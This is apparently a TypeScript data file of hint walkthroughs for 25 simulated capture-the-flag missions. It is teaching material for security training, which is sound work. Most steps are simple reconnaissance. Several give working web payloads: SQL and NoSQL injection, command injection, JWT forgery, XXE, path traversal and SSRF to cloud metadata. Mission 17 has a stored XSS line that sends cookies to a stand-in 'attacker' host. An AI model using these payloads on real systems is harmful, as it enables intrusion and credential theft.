export const WALKTHROUGHS: Record<string, string[]> = {
  '1': [
    'Start in the home directory with `pwd`.',
    'List files with `ls` to see what is in the current directory.',
    'Read `readme.txt` using `cat readme.txt` to reveal the welcome flag.',
  ],
  '2': [
    'Run `ls -la` (or `ls -a`) to reveal hidden files.',
    'Notice `.secret` is hidden in the directory listing.',
    'Read it with `cat .secret` to capture the flag.',
  ],
  '3': [
    'Run `nmap -sV target` or `nmap target` to enumerate open services.',
    'Look for the SSH service banner in the output.',
    'The banner contains the flag for this reconnaissance mission.',
  ],
  '4': [
    'Use `exiftool image.jpg` to inspect EXIF metadata.',
    'Review the Author/Comment fields for embedded strings.',
    'The flag is hidden in the metadata comments.',
  ],
  '5': [
    'Open the Target Web Preview and locate the login form.',
    'Enter a username like `admin` and a SQL injection payload such as `\' OR \'1\'=\'1` in the password.',
    'Submit the form; the backend bypasses authentication and the flag appears.',
  ],
  '6': [
    'In the Target Web Preview, notice the user profile page accepts an `id` parameter.',
    'Change the `id` value to `2` (or another user) to access another user\'s profile.',
    'The unauthorized profile contains the flag.',
  ],
  '7': [
    'Open the cookie editor in the Target Web Preview and find the `session` cookie.',
    'Decode the JWT (base64) and change the role to `admin`.',
    'Save the modified cookie and reload the page to get the flag.',
  ],
  '8': [
    'Inspect the file `/opt/cracks/hash.txt` or the current directory for an MD5 hash.',
    'Run `john --format=raw-md5 hash.txt` to crack it, or try `md5` matching.',
    'The cracked password output also contains the flag.',
  ],
  '9': [
    'Find a base64-encoded string in the files, e.g. `cat encoded.txt`.',
    'Run `base64 -d <string>` or `echo "<string>" | base64 -d`.',
    'The decoded text contains the flag.',
  ],
  '10': [
    'Locate the suspicious binary or log file in the VFS.',
    'Use `strings` to dump human-readable strings from it.',
    'Look for a FLAG{...} block in the strings output.',
  ],
  '11': [
    'Find the image file, e.g. `stego.png`, in the current directory.',
    'Use `strings` or `exiftool` to look for hidden text appended to the image.',
    'The flag is embedded in the trailing data.',
  ],
  '12': [
    'Use `curl http://target/api/v1/internal/config` to hit the internal API.',
    'The JSON response leaks an AWS key and the flag.',
    'Copy the flag from the response.',
  ],
  '13': [
    'Run `ftp 10.0.0.5` to initiate an FTP session.',
    'Login with user `anonymous` and password `anonymous`.',
    'List files with `ls` and download `backup.zip` with `get backup.zip`; the download message contains the flag.',
  ],
  '14': [
    'In the Target Web Preview, the ping utility accepts user input.',
    'Append a command separator: `8.8.8.8; cat /etc/passwd` or `8.8.8.8 && cat /etc/passwd`.',
    'Submit and the output will contain the flag.',
  ],
  '15': [
    'Open the JWT editor in the Target Web Preview.',
    'Change the JWT header algorithm to `{"alg":"none"}`.',
    'Set the payload admin field to `true` and submit; the server accepts the forged token and returns the flag.',
  ],
  '16': [
    'Run `aws s3 ls s3://company-public-assets/` to list the bucket.',
    'Use `aws s3 cp s3://company-public-assets/.env .` to download the env file.',
    'The file content includes the leaked flag.',
  ],
  '17': [
    'In the Target Web Preview, open the comment box.',
    'Submit a stored XSS payload such as `<script>fetch(\'http://attacker/?c=\'+document.cookie)</script>`.',
    'The server reflects the payload and the flag is exposed.',
  ],
  '18': [
    'Locate the packet capture at `/var/backups/capture.pcap`.',
    'Run `strings /var/backups/capture.pcap` to dump plaintext.',
    'Search the output for the HTTP POST and the flag.',
  ],
  '19': [
    'Look in `/var/backups/` for `id_rsa` using `ls` or `find`.',
    'Read the key with `cat /var/backups/id_rsa`.',
    'Run `ssh -i /var/backups/id_rsa root@target` to authenticate and capture the flag.',
  ],
  '20': [
    'Run `GetUserSPNs.py -dc-ip 10.0.0.10 -request` to request TGS tickets.',
    'The tool saves the ticket hash to `/home/user/tgs.hash`.',
    'Crack the hash with `john /home/user/tgs.hash` to get the password and the flag.',
  ],
  '21': [
    'The vulnerable endpoint is `http://target/fetch?url=`.',
    'Pass the cloud metadata URL: `curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"`.',
    'The proxy fetches internal metadata and the JSON response contains the flag.',
  ],
  '22': [
    'The endpoint `http://target/api/import` accepts XML.',
    'Send an XXE payload: `curl -d "<?xml version=\\"1.0\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>" http://target/api/import`.',
    'The external entity is resolved and the `/etc/passwd` content reveals the flag.',
  ],
  '23': [
    'The file viewer is at `http://target/download?file=`.',
    'Traverse outside the webroot with `curl "http://target/download?file=....//....//etc/passwd"`.',
    'The leaked `/etc/passwd` contains the flag.',
  ],
  '24': [
    'The NoSQL login endpoint is `http://target/nosql-login`.',
    'Send a JSON payload that bypasses the check: `curl -X POST -H "Content-Type: application/json" -d \'{"username":{"$ne":null}}\' http://target/nosql-login`.',
    'The server logs you in as admin and returns the flag.',
  ],
  '25': [
    'The `.git` directory is exposed at `http://target/.git/HEAD`.',
    'Run `curl http://target/.git/HEAD` to read the HEAD reference.',
    'The response exposes the current branch and the flag.',
  ],
};
